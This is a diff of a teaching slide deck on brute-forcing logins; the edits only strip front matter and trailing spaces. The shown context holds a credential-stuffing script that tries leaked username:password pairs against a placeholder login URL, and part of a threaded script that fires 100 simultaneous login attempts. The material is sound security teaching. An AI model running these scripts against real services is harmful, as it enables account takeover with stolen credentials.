@@ -1,9 +1,3 @@
----
-marp: true
-theme: default
-paginate: true
----
-
 # Brute-Forcing Logins & Implementation Flaws
 
 ## Automated Credential Attacks
@@ -107,7 +101,7 @@ import requests
 with open('leaked_creds.txt') as f:
     for line in f:
         user, password = line.strip().split(':')
-        resp = requests.post('https://target.com/login', 
+        resp = requests.post('https://target.com/login',
             data={'username': user, 'password': password})
         if 'Dashboard' in resp.text:
             print(f'[+] Valid: {user}:{password}')
@@ -231,7 +225,7 @@ def login_attempt(password):
 
 # Send 100 requests simultaneously
 passwords = ['pass' + str(i) for i in range(100)]
-threads = [threading.Thread(target=login_attempt, args=(p,)) 
+threads = [threading.Thread(target=login_attempt, args=(p,))
            for p in passwords]
 
 # Start all threads at nearly the same time
